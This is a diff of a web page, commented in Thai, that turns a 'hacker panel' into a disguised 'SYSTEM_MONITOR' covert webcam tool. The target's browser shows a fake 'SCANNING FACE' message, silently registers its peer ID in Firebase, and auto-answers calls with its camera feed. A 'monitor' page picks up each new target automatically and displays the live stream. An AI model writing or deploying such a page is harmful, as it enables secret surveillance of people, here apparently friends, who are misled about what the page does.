@@ -1,104 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HACKER PANEL v.03</title>
+    <title>SYSTEM_MONITOR_v4</title>
     <style>
-        body { background: #000; color: #00ff00; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', monospace; }
-        
-        .monitor-frame {
-            position: relative;
-            width: 80vh; 
-            aspect-ratio: 4 / 3;
-            background: #111;
-            border: 3px solid #00ff00;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
-        }
-
+        body { background: #000; color: #0f0; font-family: monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .monitor { width: 80vh; aspect-ratio: 4/3; border: 2px solid #0f0; background: #050505; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-
-        .controls { margin-top: 20px; display: flex; gap: 10px; z-index: 10; }
-
-        input {
-            background: #000; border: 1px solid #00ff00; color: #00ff00;
-            padding: 10px; width: 250px; outline: none; font-family: monospace;
-        }
-
-        button {
-            background: #00ff00; color: #000; border: none;
-            padding: 10px 20px; cursor: pointer; font-weight: bold;
-        }
-
-        button:hover { background: #008800; color: #fff; }
-
-        .overlay { position: absolute; top: 10px; left: 10px; font-size: 14px; pointer-events: none; }
-        #my-id-display { position: absolute; bottom: 10px; font-size: 12px; color: #888; }
+        .log { position: absolute; top: 10px; left: 10px; font-size: 12px; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <div class="monitor-frame">
-        <div class="overlay">● CONNECTED_STREAM_4:3</div>
-        <video id="remote-video" autoplay playsinline></video>
+    <div class="monitor">
+        <div class="log" id="log-text">SYSTEM: IDLE</div>
+        <video id="v" autoplay playsinline></video>
     </div>
 
-    <div class="controls">
-        <input type="text" id="target-id" placeholder="ใส่ ID ของเพื่อนที่นี่...">
-        <button onclick="connectToFriend()">HACK START</button>
-    </div>
-
-    <div id="my-id-display">กำลังเตรียมระบบ...</div>
-
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    
+
     <script>
-        const remoteVideo = document.getElementById('remote-video');
-        const targetInput = document.getElementById('target-id');
-        const idDisplay = document.getElementById('my-id-display');
-        
-        // 1. สร้าง ID ของเราเอง (และเตรียมรับสาย)
-        const peer = new Peer(); 
+        // 1. 🔥 เติมค่า Config จาก Firebase ของคุณตรงนี้
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.appspot.com",
+            messagingSenderId: "YOUR_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const v = document.getElementById('v');
+        const log = document.getElementById('log-text');
+        const peer = new Peer();
+
+        // ตรวจสอบว่าเป็น "คนดู" หรือ "เป้าหมาย" จาก URL
+        const isMaster = new URLSearchParams(window.location.search).has('monitor');
 
         peer.on('open', (id) => {
-            idDisplay.innerText = "YOUR SYSTEM ID: " + id;
+            if (!isMaster) {
+                // --- ส่วนของเป้าหมาย (เพื่อน) ---
+                log.innerText = "SYSTEM: SCANNING FACE...";
+                // ส่ง ID ไปเก็บใน Firebase อัตโนมัติ
+                db.ref('last_target').set({ id: id, time: Date.now() });
+            } else {
+                // --- ส่วนของคุณ (Master) ---
+                log.innerText = "SYSTEM: MONITORING MODE";
+                // คอยดักฟังว่ามี ID ใหม่เข้ามาไหม
+                db.ref('last_target').on('value', (snap) => {
+                    const data = snap.val();
+                    if (data) connectToTarget(data.id);
+                });
+            }
         });
 
-        // 2. ฟังก์ชันเมื่อเรากดปุ่มเพื่อไป "ดูหน้าเพื่อน"
-        async function connectToFriend() {
-            const friendId = targetInput.value;
-            if (!friendId) { alert("กรุณาใส่ ID เพื่อนก่อน!"); return; }
-
+        // ฟังก์ชันเชื่อมต่อ (ฝั่ง Master)
+        async function connectToTarget(targetId) {
+            log.innerText = "SYSTEM: ATTEMPTING HACK -> " + targetId;
             try {
-                // ขอเปิดกล้องฝั่งเรานิดหน่อยตามระบบของ WebRTC (ถ้าไม่อยากให้เพื่อนเห็นเรา ให้ใช้ stream เปล่าๆ)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // โทรหา ID เพื่อน
-                const call = peer.call(friendId, stream);
-                
-                call.on('stream', (remoteStream) => {
-                    // พอเพื่อนรับสาย (แบบออโต้) ภาพเพื่อนจะมาโผล่ที่จอเรา
-                    remoteVideo.srcObject = remoteStream;
-                });
-
-                alert("กำลังเจาะระบบเข้าเครื่องเป้าหมาย...");
-            } catch (err) {
-                alert("เกิดข้อผิดพลาด: " + err.message);
-            }
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const call = peer.call(targetId, s);
+                call.on('stream', (rs) => { v.srcObject = rs; log.innerText = "CONNECTED: LIVE FEED"; });
+            } catch (e) {}
         }
 
-        // 3. ส่วนสำคัญ: เครื่องเพื่อนต้อง "รับสายอัตโนมัติ"
-        peer.on('call', (call) => {
-            // เมื่อมีคน (เรา) โทรไปหาเพื่อน เครื่องเพื่อนจะส่งภาพกลับมาทันที
-            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-                call.answer(stream);
-                call.on('stream', (remoteStream) => {
-                    remoteVideo.srcObject = remoteStream;
-                });
+        // รับสายอัตโนมัติ (ฝั่งเพื่อน)
+        peer.on('call', (c) => {
+            navigator.mediaDevices.getUserMedia({ video: true }).then((s) => {
+                c.answer(s);
+                c.on('stream', (rs) => { v.srcObject = rs; }); // เพื่อนเห็นหน้าตัวเอง
             });
         });
-
     </script>
 </body>
 </html>
